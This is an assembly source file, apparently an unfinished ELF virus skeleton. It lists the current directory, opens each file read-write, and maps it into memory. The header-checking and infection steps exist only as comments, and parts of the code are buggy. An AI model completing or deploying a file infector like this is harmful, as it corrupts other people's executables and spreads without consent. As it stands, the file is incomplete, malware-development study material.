%include "war.s"

section .text
  global _start

section .data
msg db 'Hello, world!',0xa,0x0
msg_len equ $ - msg
dot db '.',0x0
dot_len equ $ - dot
n db 0xa
n_len equ $ - n

section .text

strlen: ; rax *str
  push rbx ; rbx will be used to store initial rax value

  mov rbx, rax ; store rax in rbx
  .while:
    cmp [rax], byte 0 ; compare with \0
    je .end

    inc rax ; increment rax
    jmp .while ; loop

  .end:
    sub rax, rbx ; compute difference between rax and rbx
    pop rbx ; don't forget to set back rbx that we previously pushed
    ret

ft_write: ; rax *str
  push rbx
  push rcx
  push rdx
  push rsi
  push rdi

  mov rcx, rax ; store str in rcx
  call strlen ; compute its length

  mov rdx, rax ; length
  mov rsi, rcx
  mov rdi, 1 ; STDOUT
  mov rax, 1
  syscall

  mov rdx, 1 ; length
  mov rsi, n ;  \n
  mov rdi, 1 ; STDOUT
  mov rax, 1 ; write syscall
  syscall


  pop rdi
  pop rsi
  pop rdx
  pop rcx
  pop rbx
  ret


hello:
  push rax
  mov eax, msg
  call ft_write
  pop rax
  ret

_start:
  push rbp
  mov rbp, rsp
  ; deactivate signals?

  sub rsp, 0x2710;0x430 ; char buf[1024]
  mov rcx, 0 ; O_RDONLY
  lea rbx, [dot] ; "."
  mov rax, 5 ; open syscall
  int 0x80 ; execute syscall

  mov [rbp - 0x424], rax ; store result of open into fd


  mov rdx, 0x100 ; count = 1024
  lea rsi, [rbp - 0x400] ; load buf
  mov rdi, [rbp - 0x424] ; load fd
  mov rax, 217 ; getdents64. 78 for getdents
  syscall

  mov [rbp - 0x424], rax ; store result of getdents64
  mov rcx, rax
  xor rax, rax
  mov [rbp - 0x41c], rax ; num = 0
  mov rax, [rbp - 0x41c] ; load num in rax
  cmp rax, [rbp - 0x424] ; while (num < res)
  jge end

  .while:
    mov rax, [rbp - 0x41c] ; rax = num
    lea rdx, [rbp - 0x400] ; rdx = (address) buf

    add rax, rdx ; p = buf + num

    ; num += p->d_reclen
    mov rbx, [rbp - 0x41c] ; rbx = num
    mov cx, [rax + linux_dirent.d_reclen] ; rcx = p->d_reclen
    add bx, cx ; rbx += rcx
    mov [rbp - 0x41c], rbx ; store rbx in num

    lea rax, [rax + linux_dirent.d_name]

    .open_file: ; try to open file, and if we succeeded then stat it
      mov rdi, rax ; d_name
      mov rax, 2 ; open syscall
      mov rsi, 2; O_RDWR / Read and Write
      syscall

      cmp rax, 0
      jl .next_file
      mov [rbp - 0x430], rax ; store fd 
      mov rax, rdi
      call ft_write
      lea r15, [rbp - 0x2710]
      .stat:
        mov rax, 5 ; fstat syscall
        mov rdi, [rbp - 0x430] ; load fd
        mov rsi, r15 ; statbuf struct
        syscall

        cmp rax, 0
        jl .next_file ; if error continue to next_file
        ; mov r14, [r15 + 168] ; store target original ehdr.entry 

        ; mmap
        ; mmap(NULL, buf.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0))
        mov rdi, 0 ; NULL
        mov rsi, [r15 + stat.st_size]; buf.st_size
        mov rdx, 3 ; PROT_READ | PROT_WRITE
        mov r10, 2; MAP_PRIVATE
        mov r8, [rbp - 0x430] ; fd
        mov r9, 0;  offset
        mov rax, 9 ; mmap syscall
        syscall

        cmp rax, 0; if error continue SCOTT modified to stop
        jl end ; .next_file

        ; check headers
        ; infect
        ; munmap
        ; close


    .next_file
      mov rbx, [rbp - 0x41c] ; 
      cmp rbx, [rbp - 0x424] ; compare num with result from getdents64
      jl .while

  end:
    ; reactivate signals?
    mov ebx, 0 ; exitcode 0
    mov eax, 1 ; exit syscall
    int 0x80 ; execute syscall
